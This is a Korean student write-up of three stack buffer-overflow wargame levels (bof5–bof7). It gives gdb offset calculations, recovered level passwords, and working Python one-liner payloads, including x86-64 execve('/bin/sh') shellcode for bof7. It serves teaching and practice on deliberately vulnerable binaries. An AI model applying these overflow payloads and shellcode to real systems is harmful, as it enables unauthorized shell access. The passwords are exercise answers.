# hw3 (bof5~7)


> bof5  
1. 이전과 비슷하나 innocent와 key값이 같을 때 /bin/sh를 실행하지않고 system() 함수를 buf를 인자로 실행한다. 
2. 그럼 buf에 쉘코드(/bin/sh)를 넣어주고
3. buf와 innocent 사이의 크기에서 /bin/sh의 크기 + \x00(8bytes)를 뺸 값을 (\x00은 뒤에서 설명) Dummy 값으로 넣어주며 innocent에 넣어줄 key 값을 little endian 형식으로 입력하면 된다.

>> 답(bof6.pw): b35aad61

>> 풀이:

    b.p.1: gets할 떄 $rdi  0x7fffffffeb00
    b.p.2: cmp에서 $rbp -4 주소값  0x7fffffffeb8c
    bp1과 bp2 차이 = 140


이때 /bin/sh를 끝맺음 짓기위해 \x00를 추가적으로 넣어준다. 만약 \x00이 없다면 뒤에 있는 dummy값까지 고려되기 때문에 실패할 것이다.

    (python -c "print '/bin/sh' + '\x00' + 'A' * 132 + '\x78\x56\x34\x12'";cat) | ./bof5


> bof6
1. gets(buf)에서 $rdi를 확인하여 buf의 주소 확인
2. buf부터 ret전까지 Dummy값으로 채우고 ret에 쉘코드가 담긴 shellcode[]주소 넣기

>> 답(bof7.pw): ffa35d7e

>> 풀이:

    b.p.1: printf shellcode에서 shellcode[]의 시작주소 확인 0x7fffffffeb30
    b.p.2: gets 할 때 $rdi (buf 시작주소), $rbp = sfp 까지 주소값
    $rdi: 0x7fffffffeb10
    $rbp: 0x7fffffffeb90
    rbp-rdi = 128
    128 + sfp(8) = 136 bytes의 Dummy 값 (64bits)

    (python -c "print 'A' * 136 + '\x30\xeb\xff\xff\xff\x7f'";cat) | ./bof6

> bof 7
1. vuln 함수의 ret에 buf 주소를 넣어 vuln함수가 끝날 때 buf로 return이 되도록함
2. buf에 저장되는 main의 argv[1] 값을 buf~ret까지의 크기를 구하고 그 크기만큼의 shellcode+DUMMY 값 입력

>> 답(bof8.pw): 0dc54105

>> 풀이:

    b.p.1: vuln실행 직후 $rsp - 12 값 확인-> (*64bits에서 주소는 6bits)
    $rsp - 12: 0x7fffffffeb7c (rsp = vuln stack의 argv 부분까지 포함, -12 ==> ret의 시작주소까지)
    b.p.2: vuln의 프롤로그 직후 $rsp + 4 (buf)
    $rsp + 4: 0x7fffffffeaf4
    차이: 136 (buf~ret)

argv를 SHELLCODE+DUMMY (136) + buf주소(6)로 입력. argv를 받는 식이니 standard input이 아니다!

    ./bof7 `python -c "print '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'+'x'*109+'\xb0\xea\xff\xff\xff\x7f'"`